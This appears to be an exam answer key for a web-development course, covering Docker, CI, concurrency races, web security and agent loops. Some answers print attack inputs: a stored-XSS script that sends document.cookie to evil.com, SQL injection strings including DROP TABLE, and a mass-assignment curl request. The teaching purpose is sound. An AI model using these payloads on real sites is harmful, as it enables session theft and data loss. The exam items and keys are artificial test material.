+<ol><li>The team rebuilds this image many times a day as they edit application code, and rebuilds are slower than they should be. One thing here is already done right and one step is the culprit -- identify both, and restructure so a one-line change to <code>app.py</code> rebuilds quickly.</li><li>This image is pushed to a shared registry. What secrets does it expose, by what mechanisms, and how do you keep them out of the image?</li><li>You realize this image was already pushed last week. You delete the secrets from the Dockerfile and add a <code>.dockerignore</code> now. Is that enough? What do you actually do?</li></ol>
+  <div class="answer"><span class="answer-label">Answer / key</span>
+  <p>1. Already right: <code>requirements.txt</code> is copied and installed before <code>COPY . .</code>, so the dependency layer stays cached when only code changes -- do not &quot;fix&quot; that. The culprit: the <code>apt-get install imagemagick</code> step sits AFTER <code>COPY . .</code>, so a slow system install re-runs on every code edit (and so does everything below it). Restructure so stable, slow steps are high and fast-changing code is last: move the <code>apt-get</code> install near the top, then <code>COPY requirements.txt</code> + <code>pip install</code>, then <code>COPY . .</code>. Now a one-line <code>app.py</code> change invalidates only the final copy layer.</p>
+<p>2. Two vectors. (a) <code>ENV JWT_SECRET=...</code> / <code>ENV DATABASE_URL=...</code> hardcode real secrets into the image (readable via <code>docker history</code> and to anyone who pulls) and into the Dockerfile, which lives in the repo. (b) With no <code>.dockerignore</code>, <code>COPY . .</code> also bakes the project&#x27;s <code>.env</code> into a layer. Fix: take secrets out of the Dockerfile entirely and inject them at run time (<code>-e</code> / <code>--env-file</code> / dashboard), and add a <code>.dockerignore</code> (excluding <code>.env</code>, <code>.git</code>, <code>__pycache__</code>) so nothing secret is copied in.</p>
+<p>3. Not enough. The secrets are already inside the image that was pushed (its layers and history), so cleaning the Dockerfile now does not change what is already published. Treat them as leaked: rotate them (new DB password / JWT signing secret), rebuild and repush a clean image, and update the runtime config with the new values.</p></div>
+</div>
+
+<div class="question">
+  <div class="q-header"><span class="q-id">T7-Q1</span><span class="q-meta">T7 — CI/CD with GitHub Actions (8.2)<br>Trace-through</span></div>
+  <p>A student removes one line from the minimal workflow and pushes. Which step in the Actions run goes red, and why?</p>
+<pre>name: Tests
+on: [push, pull_request]
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/setup-python@v6
+        with:
+          python-version: &quot;3.14&quot;
+      - run: pip install -r requirements.txt
+      - run: pytest</pre>
+  <div class="answer"><span class="answer-label">Answer / key</span>
+  <p><code>pip install -r requirements.txt</code> goes red.</p>
+<p>Each job starts on a clean VM with nothing checked out. <code>setup-python</code> installs Python fine (it does not need your code). Then <code>pip install</code> looks for <code>requirements.txt</code>, which is not there -- the missing step is <code>- uses: actions/checkout@v6</code> at the top.</p></div>
+</div>
+
+<div class="question">
+  <div class="q-header"><span class="q-id">T7-Q2</span><span class="q-meta">T7 — CI/CD with GitHub Actions (8.2)<br>Spot the bug</span></div>
+  <p>This deploy workflow has two security problems. Name both (one sentence each) and give the safe pattern.</p>
+<pre>jobs:
+  deploy:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v6
+      - name: Ship
+        env:
+          API_KEY: sk-live-9f3a8d2b7c1e4f5a6b9d0e2f
+        run: |
+          echo &quot;Deploying with key: $API_KEY&quot;
+          curl -X POST https://api.example.com/deploy \
+               -H &quot;Authorization: Bearer $API_KEY&quot;</pre>
+  <div class="answer"><span class="answer-label">Answer / key</span>
+  <ol><li>The key is a hardcoded literal in a file that lives in the repo and its history, readable by anyone with read access (and every fork / PR).</li><li><code>echo &quot;...$API_KEY&quot;</code> prints it into the build log, which is public for PR runs.</li></ol>
+<p>Safe pattern: store it in repo Settings -&gt; Secrets, reference <code>${{ secrets.API_KEY }}</code> (encrypted at rest, masked in logs), and never echo it. Rotate the leaked key.</p></div>
+</div>
+
+<div class="question">
+  <div class="q-header"><span class="q-id">T7-Q3</span><span class="q-meta">T7 — CI/CD with GitHub Actions (8.2)<br>Code review</span></div>
+  <p>Two students each fixed the same bug across the same five files. Student A made one 400-line commit titled &quot;fixes&quot;. Student B made six small, single-purpose commits with descriptive messages, squashed into the PR. Weeks later CI goes red on <code>main</code> and someone runs <code>git bisect</code>. Whose history would you rather be bisecting? Then:</p>
+<ol><li>justify in three to five sentences with at least two reasons,</li><li>name one thing A&#x27;s approach does better,</li><li>name two habits from class that make either history easier to debug.</li></ol>
+  <div class="answer"><span class="answer-label">Answer / key</span>
+  <p>B is the expected pick. (1) Bisect lands on a single commit; with B that commit is a small, single-purpose diff you can read in a minute, while A&#x27;s lands you on 400 lines titled &quot;fixes&quot;. Small commits also give failure attribution and reviewable PRs.</p>
+<p>(2) A is faster to write and lands atomically -- fine for a throwaway or an indivisible change.</p>
+<p>(3) Squash each PR to one commit so bisecting <code>main</code> isolates to one PR; keep PRs small / scoped / described / green; write messages that say what changed and why. Picking A and defending it (&quot;for one indivisible change the ceremony is noise&quot;) can earn credit if the bisect tradeoff is named.</p></div>
+</div>
+
+<div class="question">
+  <div class="q-header"><span class="q-id">T7-Q4</span><span class="q-meta">T7 — CI/CD with GitHub Actions (8.2)<br>Code review</span></div>
+  <p>This workflow runs the test suite on every push; two of the tests are shown below. On the developer&#x27;s laptop the suite passes every time. In CI, <code>test_lists_single_user</code> fails about half the time.</p>
+<pre># .github/workflows/test.yml
+name: Tests
+on: [push, pull_request]
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v6
+      - uses: actions/setup-python@v6
+        with: { python-version: &quot;3.14&quot; }
+      - run: pip install -r requirements.txt
+      - run: pytest -n auto        # runs tests in parallel across CPUs</pre>
+<pre># conftest.py + test_users.py  (app talks to the module-level db.engine)
+@pytest.fixture
+def client():
+    return TestClient(app)
+
+def test_create_user(client):
+    r = client.post(&quot;/users&quot;, json={&quot;username&quot;: &quot;alice&quot;})
+    assert r.status_code == 201
+
+def test_lists_single_user(client):
+    users = client.get(&quot;/users&quot;).json()
+    assert len(users) == 1</pre>
+<ol><li>Why does <code>test_lists_single_user</code> pass locally but fail intermittently in CI?</li><li>Is the bug in the workflow or in the tests? Point to the specific cause.</li><li>Give two fixes -- one to the tests, one you could make to the workflow -- and say which is the real fix.</li></ol>
+  <div class="answer"><span class="answer-label">Answer / key</span>
+  <p>1. The tests share one database (the module-level <code>db.engine</code>) with no per-test isolation, and <code>test_lists_single_user</code> asserts an exact global count. Locally the suite runs serially in a stable order against a known DB; CI runs on a fresh VM with <code>pytest -n auto</code>, so <code>test_create_user</code> (and any other user-creating test) runs in parallel and the count is 0, 1, or 2 unpredictably.</p>
+<p>2. The bug is in the tests: no isolation, plus an assertion on global state (<code>len(users) == 1</code>) that only holds under a specific order/state. The workflow merely exposes it via the fresh VM and parallelism.</p>
+<p>3. Test fix (the real one): isolate each test with a <code>test_db</code> fixture (swap <code>db.engine</code> to a fresh in-memory engine per test) and have the test arrange its own data and assert on that user, not a global count. Workflow fix (a band-aid): drop <code>-n auto</code> so tests run serially -- it hides the flake but leaves the shared-state bug.</p></div>
+</div>
+
+<div class="question">
+  <div class="q-header"><span class="q-id">T8-Q1</span><span class="q-meta">T8 — Concurrency (9.1)<br>Trace-through</span></div>
+  <p>Two <code>withdraw($10)</code> requests hit this code at the same time against a starting balance of $100. There is no transaction, and each handler runs the three steps below. Both reads happen before either write. What is the final balance, what should it have been, and why does the discrepancy happen?</p>
+<pre>def withdraw(account_id, amount):
+    bal = read_balance(account_id)        # SELECT balance ...
+    new_bal = bal - amount
+    write_balance(account_id, new_bal)    # UPDATE balance ...</pre>
+  <div class="answer"><span class="answer-label">Answer / key</span>
+  <p>Final: $90. Should have been $80. Both reads see 100, both compute 90, both write 90 -- one withdrawal is silently lost.</p>
+<p>It is a lost update (a read-modify-write race). The fix makes read-and-write atomic with a transaction / row lock, so the second withdrawal reads the already-updated balance.</p></div>
+</div>
+
+<div class="question">
+  <div class="q-header"><span class="q-id">T8-Q2</span><span class="q-meta">T8 — Concurrency (9.1)<br>Spot the bug</span></div>
+  <p>Two requests, alice and bob, hit this endpoint at nearly the same moment. Explain how alice&#x27;s withdrawal can come out of bob&#x27;s account; then give the fix in one sentence.</p>
+<pre>current_user: str | None = None
+
+@app.post(&quot;/transfer&quot;)
+def transfer(req: TransferRequest):
+    global current_user
+    current_user = req.username        # stash who is calling
+    account = look_up_account()        # some I/O, takes a moment
+    deduct(current_user, req.amount)   # read it back</pre>
+  <div class="answer"><span class="answer-label">Answer / key</span>
+  <p><code>current_user</code> is a module-level global shared by every request on the process. Alice sets it to &quot;alice&quot;; during <code>look_up_account()</code> bob&#x27;s request runs and overwrites it to &quot;bob&quot;; when alice&#x27;s handler resumes, <code>current_user</code> is &quot;bob&quot;, so it deducts from bob.</p>
+<p>Fix: do not stash per-request data in module / global state -- keep identity in a local variable / the request scope. This is why statelessness is a concurrency decision.</p></div>
+</div>
+
+<div class="question">
+  <div class="q-header"><span class="q-id">T8-Q3</span><span class="q-meta">T8 — Concurrency (9.1)<br>Code review</span></div>
+  <p>Two implementations of the same <code>withdraw</code>. Pick the one you would ship, justify with at least two reasons, and name one situation where the difference does NOT matter.</p>
+<pre># Version A
+def withdraw(account_id, amount):
+    with db.engine.begin() as conn:
+        row = conn.execute(
+            text(&quot;SELECT balance FROM accounts WHERE id = :id&quot;),
+            {&quot;id&quot;: account_id},
+        ).first()
+        conn.execute(
+            text(&quot;UPDATE accounts SET balance = :b WHERE id = :id&quot;),
+            {&quot;b&quot;: row.balance - amount, &quot;id&quot;: account_id},
+        )
+
+# Version B
+def withdraw(account_id, amount):
+    with db.engine.begin() as conn:
+        row = conn.execute(
+            text(&quot;SELECT balance FROM accounts WHERE id = :id FOR UPDATE&quot;),
+            {&quot;id&quot;: account_id},
+        ).first()
+        conn.execute(
+            text(&quot;UPDATE accounts SET balance = :b WHERE id = :id&quot;),
+            {&quot;b&quot;: row.balance - amount, &quot;id&quot;: account_id},
+        )</pre>
+  <div class="answer"><span class="answer-label">Answer / key</span>
+  <p>Ship B. (1) Both wrap the work in a transaction, but A still reads and writes as a read-modify-write, so two concurrent withdrawals can both read the same balance and lose an update -- a transaction alone does not serialize them. (2) B&#x27;s <code>FOR UPDATE</code> takes a row lock, so the second withdrawal waits and reads the updated value.</p>
+<p>Where it does not matter: if writes to a given account are never concurrent (a single-threaded batch job, or an account only one request ever touches at a time), A and B behave identically. The race needs two requests on the same row at once.</p></div>
+</div>
+
+<div class="question">
+  <div class="q-header"><span class="q-id">T8-Q4</span><span class="q-meta">T8 — Concurrency (9.1)<br>Trace-through</span></div>
+  <p>Sign-up requires a unique username. Two requests try to register &quot;alice&quot; at the same instant. The handler is below, and there is NO unique constraint on the <code>username</code> column. Both requests run their SELECT before either runs its INSERT.</p>
+<pre>def register(username):
+    existing = db.execute(
+        text(&quot;SELECT id FROM users WHERE username = :u&quot;), {&quot;u&quot;: username}
+    ).first()
+    if existing:
+        raise HTTPException(409, &quot;username taken&quot;)
+    db.execute(
+        text(&quot;INSERT INTO users (username) VALUES (:u)&quot;), {&quot;u&quot;: username}
+    )</pre>
+<ol><li>What ends up in the <code>users</code> table, and why?</li><li>How does this race differ from the lost-update / read-modify-write race?</li><li>The team adds <code>UNIQUE(username)</code> to the column. Now what happens to the two racing requests?</li></ol>
+  <div class="answer"><span class="answer-label">Answer / key</span>
+  <p>1. Two rows for &quot;alice&quot;. Both SELECTs run before either INSERT, so both find no existing alice, both pass the <code>if existing</code> guard, and both INSERT. The 409 check never fires.</p>
+<p>2. Check-then-act (a time-of-check-to-time-of-use race): the check and the act are not atomic, so another request slips in between them.</p>
+<p>3. One INSERT succeeds; the other violates <code>UNIQUE(username)</code> and raises an IntegrityError, which the app should catch and return as the 409. The constraint enforces uniqueness atomically at the database regardless of timing, so the earlier SELECT check is only an optimization and no longer what prevents duplicates.</p></div>
+</div>
+
+<div class="question">
+  <div class="q-header"><span class="q-id">T8-Q5</span><span class="q-meta">T8 — Concurrency (9.1)<br>Trace-through</span></div>
+  <p>A promo code grants $10 of account credit, once per user. On a flaky connection a user double-taps redeem, so two identical requests arrive at nearly the same instant. The handler is below; both requests run their SELECT before either runs its INSERT.</p>
+<pre>def redeem(user_id, code):
+    already = db.execute(
+        text(&quot;SELECT 1 FROM redemptions WHERE user_id = :u AND code = :c&quot;),
+        {&quot;u&quot;: user_id, &quot;c&quot;: code},
+    ).first()
+    if already:
+        raise HTTPException(409, &quot;already redeemed&quot;)
+    db.execute(text(&quot;INSERT INTO redemptions (user_id, code) VALUES (:u, :c)&quot;),
+               {&quot;u&quot;: user_id, &quot;c&quot;: code})
+    db.execute(text(&quot;UPDATE accounts SET credit = credit + 10 WHERE user_id = :u&quot;),
+               {&quot;u&quot;: user_id})</pre>
+<ol><li>What happens, and how much credit does the user end up with?</li><li>A teammate wraps the whole handler in one transaction (<code>with db.engine.begin() as conn:</code> for each request). Does that fix the issue? Explain.</li><li>What actually prevents it? Give one concrete mechanism and why it is atomic.</li></ol>
+  <div class="answer"><span class="answer-label">Answer / key</span>
+  <p>1. Both SELECTs see no prior redemption, both pass the 409 guard, and both run the INSERT and the +$10 update. The user ends with $20 of credit (and two redemption rows) for a once-only code.</p>
+<p>2. No. Wrapping each request in a transaction makes that request&#x27;s writes commit or roll back together, but it does not lock the rows the SELECT read, so both requests still run their SELECT, see nothing, and proceed. A transaction is not a lock; on its own it does not serialize the two requests.</p>
+<p>3. A <code>UNIQUE(user_id, code)</code> constraint on <code>redemptions</code> makes the second INSERT fail atomically (IntegrityError -&gt; 409) regardless of timing; or take a row lock (<code>SELECT ... FOR UPDATE</code>) so the second request waits for the first to commit. The database enforces it atomically, unlike the app-level check-then-act.</p></div>
+</div>
+
+<div class="question">
+  <div class="q-header"><span class="q-id">T9-Q1</span><span class="q-meta">T9 — Web security basics (9.2)<br>Spot the bug</span></div>
+  <p>Your agent produced this endpoint. Conversations are private direct-message threads. The endpoint returns a thread&#x27;s messages, newest first, optionally filtered by text. It passes the obvious tests. It has at least three distinct defects -- some security, some availability. For each: a value that triggers it, one sentence on what goes wrong, and the fix.</p>
+<pre>@app.get(&quot;/api/conversations/{conv_id}/messages&quot;)
+def list_messages(conv_id: int, q: str = &quot;&quot;, limit: int = 100,
+                  user: User = Depends(current_user)):
+    sql = f&quot;SELECT id, sender, body FROM messages WHERE conversation_id = {conv_id}&quot;
+    if q:
+        sql += &quot; AND body LIKE &#x27;%&quot; + q + &quot;%&#x27;&quot;
+    sql += f&quot; ORDER BY id DESC LIMIT {limit}&quot;
+    with engine.connect() as conn:
+        rows = conn.execute(text(sql)).all()
+    return [dict(r._mapping) for r in rows]</pre>
+  <div class="answer"><span class="answer-label">Answer / key</span>
+  <ol><li>No authorization. The query filters by <code>conversation_id</code> but never checks that the calling <code>user</code> is a participant in that conversation. Trigger: request <code>/api/conversations/&lt;any id you are not in&gt;/messages</code> and read strangers&#x27; private DMs (IDOR / broken access control). Fix: verify the user belongs to the conversation (join/where against a participants table), 404 otherwise.</li><li>SQL injection via <code>q</code>. Trigger: <code>q=%&#x27; OR &#x27;1&#x27;=&#x27;1</code> (or <code>&#x27;; DROP TABLE messages; --</code>) -- the input becomes query structure. Fix: parameterize with a bound placeholder and pass the <code>%...%</code> as the value.</li><li><code>limit</code> has no upper bound, so a caller can pass <code>limit=999999999</code> and force the database to scan and return the whole conversation (an availability hit). It is typed <code>int</code>, so it is not an injection vector -- the fix is just to cap it, e.g. <code>min(limit, 100)</code>.</li></ol>
+<p>Note <code>conv_id</code> and <code>limit</code> are typed <code>int</code>, so FastAPI coerces them and rejects non-integers; only <code>q</code>, a string interpolated into the SQL, is an injection vector.</p></div>
+</div>
+
+<div class="question">
+  <div class="q-header"><span class="q-id">T9-Q2</span><span class="q-meta">T9 — Web security basics (9.2)<br>Spot the bug</span></div>
+  <p>A chat client renders each incoming message like this. Find the vulnerability, give a payload that exploits it, and the fix (including the React equivalent).</p>
+<pre>function renderMessage(msg) {
+  const li = document.createElement(&quot;li&quot;);
+  li.innerHTML = msg.text;
+  list.append(li);
+}</pre>
+  <div class="answer"><span class="answer-label">Answer / key</span>
+  <p>Stored XSS. <code>innerHTML</code> parses <code>msg.text</code> as HTML, so a message whose text is <code>&lt;script&gt;fetch(&#x27;https://evil.com/?c=&#x27; + document.cookie)&lt;/script&gt;</code> runs in every viewer&#x27;s browser and exfiltrates their session cookie.</p>
+<p>Fix: <code>li.textContent = msg.text</code>, which treats the value as literal text. In React, <code>{msg.text}</code> is auto-escaped; the only unsafe path is <code>dangerouslySetInnerHTML</code>.</p></div>
+</div>
+
+<div class="question">
+  <div class="q-header"><span class="q-id">T9-Q3</span><span class="q-meta">T9 — Web security basics (9.2)<br>Code review</span></div>
+  <p>Two request models for <code>PATCH /users/me</code>; both endpoints do <code>body.model_dump(exclude_unset=True)</code> and UPDATE those columns for <code>user.id</code>. Pick the safe one, explain in one sentence the exact attack the other allows, and say what makes the safe version safe.</p>
+<pre># Version A
+class UserUpdate(BaseModel):
+    name: str | None = None
+    bio: str | None = None
+    is_admin: bool | None = None
+
+# Version B
+class UserSelfUpdate(BaseModel):
+    name: str | None = None
+    bio: str | None = None</pre>
+  <div class="answer"><span class="answer-label">Answer / key</span>
+  <p>B is safe. A accepts <code>is_admin</code> in the self-service model, so <code>curl -X PATCH /users/me -d &#x27;{&quot;is_admin&quot;: true}&#x27;</code> makes any user an admin.</p>
+<p>That is mass assignment (a privilege-escalation flavor of broken access control). B is safe because the request schema only contains fields the user is allowed to set, so privileged fields cannot be bound. The fix is a separate model per privilege level, not validation bolted on later.</p></div>
+</div>
+
+<div class="question">
+  <div class="q-header"><span class="q-id">T9-Q4</span><span class="q-meta">T9 — Web security basics (9.2)<br>Short design</span></div>
+  <p>You are reviewing a teammate&#x27;s CRUD endpoints before deploy. List the authorization-audit questions from class you would run against each endpoint (aim for four), each as a one-line check.</p>
+  <div class="answer"><span class="answer-label">Answer / key</span>
+  <ol><li>By-id reads/writes: does the WHERE include an ownership clause (<code>AND owner_id = :uid</code>)?</li><li>Request bodies: can the user set a field they should not? Use a per-privilege request model.</li><li>Nested URLs <code>/parent/{a}/child/{b}</code>: does the code verify child <code>b</code> actually belongs to parent <code>a</code>?</li><li>Random / UUID ids: an unguessable id is not an authorization check -- still verify ownership.</li></ol>
+<p>Catch-all: every endpoint must answer &quot;is THIS user allowed to touch THIS data?&quot; in the query.</p></div>
+</div>
+
+<div class="question">
+  <div class="q-header"><span class="q-id">T9-Q6</span><span class="q-meta">T9 — Web security basics (9.2)<br>Spot the bug</span></div>
+  <p>Your agent produced this endpoint for a project-management app (<code>TaskUpdate</code> is a Pydantic model). It parameterizes its values and it checks authorization. Read it carefully.</p>
+<pre>@app.patch(&quot;/api/projects/{project_id}/tasks/{task_id}&quot;)
+def update_task(project_id: int, task_id: int, body: TaskUpdate,
+                user: User = Depends(current_user)):
+    with engine.begin() as conn:
+        member = conn.execute(
+            text(&quot;SELECT 1 FROM project_members &quot;
+                 &quot;WHERE project_id = :p AND user_id = :u&quot;),
+            {&quot;p&quot;: project_id, &quot;u&quot;: user.id},
+        ).first()
+        if member is None:
+            raise HTTPException(403, &quot;not a member of this project&quot;)
+
+        fields = body.model_dump(exclude_unset=True)
+        if not fields:
+            raise HTTPException(400, &quot;nothing to update&quot;)
+        set_clause = &quot;, &quot;.join(f&quot;{col} = :{col}&quot; for col in fields)
+        result = conn.execute(
+            text(f&quot;UPDATE tasks SET {set_clause} WHERE id = :id&quot;),
+            {**fields, &quot;id&quot;: task_id},
+        )
+    if result.rowcount == 0:
+        raise HTTPException(404)
+    return {&quot;ok&quot;: True}</pre>
+<ol><li>Name two things this endpoint does well, security-wise.</li><li>It has a serious access-control hole. Describe it, give a concrete request that exploits it, and give the fix.</li><li>The <code>SET</code> clause is built from whatever fields are in the request body. Explain the risk that creates, and what <code>TaskUpdate</code> has to guarantee for it to be safe.</li></ol>
+  <div class="answer"><span class="answer-label">Answer / key</span>
+  <p>1. Any two: it checks the caller is a member of the project before writing anything (a real authorization gate, not just authentication); it binds its values as parameters, so the inputs cannot inject SQL; it does the read-and-write in one transaction; it 400s on an empty update and 404s when no row matches.</p>
+<p>2. Container-vs-item gap: the membership check confirms the caller is on <code>project_id</code>, but the UPDATE matches <code>WHERE id = :id</code> only -- nothing ties the task to that project. A member of project 5 sends <code>PATCH /api/projects/5/tasks/9999</code> where task 9999 belongs to project 200; membership passes and the write lands on another project&#x27;s task. Fix: scope the write to the container -- <code>... WHERE id = :id AND project_id = :p</code> (rowcount 0 -&gt; 404).</p>
+<p>3. The columns written are whatever keys the body carries, so the endpoint is only as safe as <code>TaskUpdate</code>. If it strictly whitelists the user-editable fields (title, description, status), fine; if it also accepts something like <code>project_id</code> or <code>owner_id</code>, a user can move the task or change fields they should not (mass assignment); if it is a loose/<code>dict</code> model, the column name in <code>{col} = :{col}</code> is attacker-controlled and becomes SQL injection. <code>TaskUpdate</code> must be a small, purpose-built whitelist of exactly the columns a member may edit.</p></div>
+</div>
+
+<div class="question">
+  <div class="q-header"><span class="q-id">T10-Q1</span><span class="q-meta">T10 — Building an agent (10.1)<br>Trace-through</span></div>
+  <p>After three turns of chat, your code calls <code>client.messages.create(messages=messages)</code> with this list. What does the server receive on this call, and what does it remember between calls? Explain in two or three sentences.</p>
+<pre>messages = [
+  {&quot;role&quot;: &quot;user&quot;,      &quot;content&quot;: &quot;My name is Andy.&quot;},
+  {&quot;role&quot;: &quot;assistant&quot;, &quot;content&quot;: &quot;Nice to meet you, Andy.&quot;},
+  {&quot;role&quot;: &quot;user&quot;,      &quot;content&quot;: &quot;I have a dog named Pickle.&quot;},
+  {&quot;role&quot;: &quot;assistant&quot;, &quot;content&quot;: &quot;Pickle is a great name!&quot;},
+  {&quot;role&quot;: &quot;user&quot;,      &quot;content&quot;: &quot;What&#x27;s my dog&#x27;s name?&quot;},
+]</pre>
+  <div class="answer"><span class="answer-label">Answer / key</span>
+  <p>The server receives all five messages, and that is all it ever sees. The API is stateless: every call ships the entire history, the server reads it fresh and replies, and it remembers nothing between calls.</p>
+<p>The conversation &quot;memory&quot; lives in your <code>messages</code> list -- which is why the loop appends every user and assistant turn. (Same statelessness as the web server in 3.1 / 9.1.)</p></div>
+</div>
+
+<div class="question">
+  <div class="q-header"><span class="q-id">T10-Q2</span><span class="q-meta">T10 — Building an agent (10.1)<br>Spot the bug</span></div>
+  <p>This is the body of an agent loop. It calls the model, runs any tool the model asks for, and loops. It hangs forever, asking for the same tool over and over. Explain why, and give the fix.</p>
+<pre>while True:
+    r = client.messages.create(
+        model=&quot;claude-opus-4-7&quot;, max_tokens=4096,
+        tools=TOOLS, messages=messages,
+    )
+    if r.stop_reason != &quot;tool_use&quot;:
+        print(next(b.text for b in r.content if b.type == &quot;text&quot;))
+        break
+    for b in r.content:
+        if b.type == &quot;tool_use&quot;:
+            TOOLS_BY_NAME[b.name](**b.input)   # runs the tool, drops the result</pre>
+  <div class="answer"><span class="answer-label">Answer / key</span>
+  <p>The loop runs the tool but never appends anything to <code>messages</code> -- not the assistant turn, not the tool result. Because the API is stateless, the next call sends the identical history, so the model asks for the same tool again, forever. The model also never sees the tool&#x27;s output.</p>
+<p>Fix: after the call append <code>{&quot;role&quot;: &quot;assistant&quot;, &quot;content&quot;: r.content}</code>, and for each tool_use append a user message carrying a <code>tool_result</code> block (with the matching <code>tool_use_id</code> and the tool&#x27;s output). Then the history grows and the model sees the result on the next turn.</p></div>
+</div>
+
+<div class="question">
+  <div class="q-header"><span class="q-id">T10-Q3</span><span class="q-meta">T10 — Building an agent (10.1)<br>Short design</span></div>
+  <p>You are giving your final-project agent two tools: <code>read_board(board_id)</code> and <code>run_sql(query)</code> (runs an arbitrary SQL string against your database). Do not write code. Answer:</p>
+<ol><li>Which tool is dangerous, and why -- connect it to a vulnerability class from 9.2.</li><li>One concrete thing an attacker, or a confused model, could do through it.</li><li>Two design moves that keep the agent&#x27;s database access useful but safe.</li></ol>
+  <div class="answer"><span class="answer-label">Answer / key</span>
+  <p>1. <code>run_sql</code> is dangerous. It is the agent-era version of SQL / command injection: untrusted, model-chosen input flowing straight into the database, with no structure/value separation.</p>
+<p>2. Drop a table, read or dump other users&#x27; rows, escalate privileges -- anything SQL can express. A prompt-injected message could steer the model into issuing it.</p>
+<p>3. Replace the arbitrary-SQL tool with narrow, single-purpose tools (<code>read_board</code>, <code>post_message</code>) that take parameters, not raw SQL; run under a least-privilege / read-only DB role; and gate destructive actions behind an explicit confirmation. Tools are authorized access, so give the agent the narrowest capability that still does the job.</p></div>
+</div>
+
+<div class="question">
+  <div class="q-header"><span class="q-id">T4-Q4</span><span class="q-meta">T4 — React state & effects (7.1)<br>Trace-through</span></div>
+  <p>The button starts at 0. A user clicks it exactly once, and nothing else happens.</p>
+<pre>function Counter() {
+  const [n, setN] = useState(0);
+
+  async function bump() {
+    setN(n + 1);
+    await new Promise(r =&gt; setTimeout(r, 50));   // a slow network call
+    setN(n + 1);
+    console.log(&quot;n is&quot;, n);
+  }
+
+  return &lt;button onClick={bump}&gt;{n}&lt;/button&gt;;
+}</pre>
+<ol><li>What number does the button show once everything settles?</li><li>What does the console print?</li><li>Explain why the second <code>setN(n + 1)</code>, which runs after the await, does not produce a 2.</li></ol>
+  <div class="answer"><span class="answer-label">Answer / key</span>
+  <p>1. <code>1</code>. The click runs <code>bump</code> with this render&#x27;s snapshot, where <code>n === 0</code>. <code>setN(0 + 1)</code> queues 1. After the await the same closure still sees <code>n === 0</code>, so the second <code>setN(0 + 1)</code> also sets 1.</p>
+<p>2. <code>n is 0</code>. <code>console.log(n)</code> reads the same frozen <code>n</code> from the render in which <code>bump</code> was created -- still 0, even though state is now 1.</p>
+<p>3. <code>n</code> is captured from the render that created this <code>bump</code>; calling <code>setN</code> schedules a re-render with a new <code>n</code> but does not change the <code>n</code> variable inside the already-running function, and awaiting does not refresh it. To get 2, use the functional updater <code>setN(c =&gt; c + 1)</code> both times, which reads the latest queued value instead of the stale snapshot.</p></div>
+</div>
+
+<div class="question">
+  <div class="q-header"><span class="q-id">T8-Q6</span><span class="q-meta">T8 — Concurrency (9.1)<br>Trace-through</span></div>
+  <p>Two requests run at the same instant, each in its own transaction. A row is locked by the <code>UPDATE</code> that touches it, and the lock is held until the transaction commits. Both requests execute their first <code>UPDATE</code>, then their second.</p>
+<pre>-- Request 1: transfer $10 from A to B
+BEGIN;
+UPDATE accounts SET balance = balance - 10 WHERE id = A;   -- locks row A
+UPDATE accounts SET balance = balance + 10 WHERE id = B;   -- needs row B
+COMMIT;
+
+-- Request 2: transfer $5 from B to A
+BEGIN;
+UPDATE accounts SET balance = balance -  5 WHERE id = B;   -- locks row B
+UPDATE accounts SET balance = balance +  5 WHERE id = A;   -- needs row A
+COMMIT;</pre>
+<ol><li>Walk through what happens once each request has run its first <code>UPDATE</code>.</li><li>Postgres does not hang forever here. What does it actually do, and what is the application then responsible for?</li><li>Give one change to how the transfers run that prevents this from ever happening.</li></ol>
+  <div class="answer"><span class="answer-label">Answer / key</span>
+  <p>1. Request 1&#x27;s first <code>UPDATE</code> locks row A; Request 2&#x27;s first <code>UPDATE</code> locks row B. Request 1&#x27;s second <code>UPDATE</code> then needs row B (held by R2), so it waits; Request 2&#x27;s second needs row A (held by R1), so it waits. Each holds the lock the other needs -- a deadlock, and neither can proceed.</p>
+<p>2. Postgres detects the lock cycle and aborts one of the two transactions with a deadlock error, rolling it back; the other then commits. The application must catch that error and retry the aborted transfer, since it never committed.</p>
+<p>3. Acquire the row locks in a consistent order regardless of transfer direction -- e.g., always update the lower account id first -- so the two transactions can never each hold a lock the other is waiting on.</p></div>
+</div>
+
+<div class="question">
+  <div class="q-header"><span class="q-id">T9-Q7</span><span class="q-meta">T9 — Web security basics (9.2)<br>Spot the bug</span></div>
+  <p>This endpoint authenticates the caller and even checks account ownership before moving money.</p>
+<pre>class TransferRequest(BaseModel):
+    user_id: int
+    from_account: int
+    to_account: int
+    amount_cents: int
+
+@app.post(&quot;/api/transfer&quot;)
+def transfer(body: TransferRequest, user: User = Depends(current_user)):
+    with engine.begin() as conn:
+        acct = conn.execute(
+            text(&quot;SELECT owner_id FROM accounts WHERE id = :id&quot;),
+            {&quot;id&quot;: body.from_account},
+        ).first()
+        if acct.owner_id != body.user_id:
+            raise HTTPException(403, &quot;not your account&quot;)
+        conn.execute(
+            text(&quot;UPDATE accounts SET balance = balance - :a WHERE id = :id&quot;),
+            {&quot;a&quot;: body.amount_cents, &quot;id&quot;: body.from_account},
+        )
+        conn.execute(
+            text(&quot;UPDATE accounts SET balance = balance + :a WHERE id = :id&quot;),
+            {&quot;a&quot;: body.amount_cents, &quot;id&quot;: body.to_account},
+        )
+    return {&quot;ok&quot;: True}</pre>
+<ol><li>Describe the security hole and give a concrete request that exploits it.</li><li>Give the fix.</li><li>There are also multiple correctness problems, separate from the security hole. Find at least one and say how you would guard against it.</li></ol>
+  <div class="answer"><span class="answer-label">Answer / key</span>
+  <p>1. The ownership check compares the account&#x27;s <code>owner_id</code> to <code>body.user_id</code>, a value the client supplies, not to the authenticated <code>user.id</code>. An attacker sends <code>{user_id: &lt;victim&#x27;s id&gt;, from_account: &lt;victim&#x27;s account&gt;, to_account: &lt;their own&gt;, amount_cents: ...}</code>; the check passes because they set <code>user_id</code> to the victim&#x27;s, and the transfer drains the victim. Identity must come from the verified token/session, never from the request body.</p>
+<p>2. Drop <code>user_id</code> from the request and compare against the authenticated identity: <code>if acct.owner_id != user.id: raise HTTPException(403)</code>.</p>
+<p>3. Any one: no check that <code>amount_cents &gt; 0</code> (a negative amount reverses the transfer and steals) -- constrain it in the model (<code>Field(gt=0)</code>); no funds check, so the balance can go negative -- guard the debit (<code>UPDATE ... WHERE id = :id AND balance &gt;= :a</code> and treat 0 rows affected as a 409); <code>acct</code> can be <code>None</code> if the account does not exist, which crashes -- 404 first.</p></div>
+</div>
+
